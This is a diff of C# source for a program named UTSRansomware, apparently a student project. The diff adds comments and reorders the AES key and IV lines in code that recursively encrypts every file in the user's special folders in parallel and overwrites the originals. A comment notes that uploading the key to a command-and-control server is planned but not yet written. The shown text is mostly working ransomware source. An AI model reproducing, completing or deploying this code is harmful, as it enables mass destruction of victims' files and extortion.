@@ -29,6 +29,11 @@ namespace UTSRansomware
                 string folderPath = Environment.GetFolderPath(folder);
                 if (Directory.Exists(folderPath))
                 {
+                    /* 
+                     * As this just brute force tries every file in these directories it run into a lot of
+                     * UnauthorizedAccessException as even when running with admin credentials files can be still
+                     * locked or not accessable.
+                    */
                     try
                     {
                         EncryptDirectory(folderPath);
@@ -45,6 +50,10 @@ namespace UTSRansomware
 
                 }
             }
+            /* 
+             * After all encryption completed save the key and iv to text file
+             * This is where the upload to a C2 should happen but I haven't implemented that yet
+             */
             SaveKeyAndIvToDesktop();
         }
 
@@ -59,6 +68,8 @@ namespace UTSRansomware
                 EncryptDirectory(directoryPath);
             }
 
+            // Using multi threaded processing to try improve speed
+            // Don't think this is working properly so will have to fix
             Parallel.ForEach(filePaths, (filePath) =>
             {
                 try
@@ -81,16 +92,18 @@ namespace UTSRansomware
         // Encrypts a file
         public void EncryptFile(string filePath)
         {
+            // Instantiate Aes and configure its settings
             using (Aes aesAlg = Aes.Create())
             {
                 string tempFilePath = filePath + ".temp";
-                aesAlg.Key = key;
-                aesAlg.IV = iv;
                 aesAlg.Mode = CipherMode.CBC; // Setting the Cipher mode to CBC
                 aesAlg.Padding = PaddingMode.PKCS7; // Default is PKCS7
+                aesAlg.Key = key;
+                aesAlg.IV = iv;
 
                 ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);
 
+                // Outputs as a temp file that is then used to overwrite the original file
                 using (FileStream fsIn = new FileStream(filePath, FileMode.Open))
                 using (FileStream fsOut = new FileStream(tempFilePath, FileMode.Create))
                 using (CryptoStream cs = new CryptoStream(fsOut, encryptor, CryptoStreamMode.Write))
@@ -134,6 +147,7 @@ namespace UTSRansomware
             }
         }
 
+        // Writes key and iv to desktop
         private void SaveKeyAndIvToDesktop()
         {
             string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
